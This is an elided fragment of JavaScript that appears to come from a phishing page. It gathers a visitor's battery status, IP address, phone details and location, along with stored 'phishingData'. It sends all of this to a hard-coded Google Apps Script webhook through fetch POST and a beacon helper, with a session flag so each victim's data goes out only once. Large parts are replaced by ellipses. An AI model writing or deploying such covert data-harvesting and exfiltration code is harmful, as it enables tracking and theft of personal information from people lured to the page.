  ...
  try {
    ...
    if (phishingDataStr) {
      ...
      if (!sessionStorage.getItem(sentKey)) {
        ...
        const webhookUrl = 'https://script.google.com/macros/s/AKfycbz1QXOCF4neGPdkZZVi-6PYrz1Rmv0zuA6VJukvRCOAmpBIgPT4XuCw8rwPMbfL9NB8/exec';
...
(function() {
  ...
  Promise.allSettled([batteryPromise, ipPromise, phonePromise, locationPromise])
    .then(() => {
      ...
      if (window.fetch) {
        fetch('https://script.google.com/macros/s/AKfycbz1QXOCF4neGPdkZZVi-6PYrz1Rmv0zuA6VJukvRCOAmpBIgPT4XuCw8rwPMbfL9NB8/exec', {
          method: 'POST',
          headers: {
...
function sendDataWithBeacon(dataToSend) {
  const webhookUrl = 'https://script.google.com/macros/s/AKfycbz1QXOCF4neGPdkZZVi-6PYrz1Rmv0zuA6VJukvRCOAmpBIgPT4XuCw8rwPMbfL9NB8/exec'; // ตรวจสอบ URL ให้ถูกต้อง!
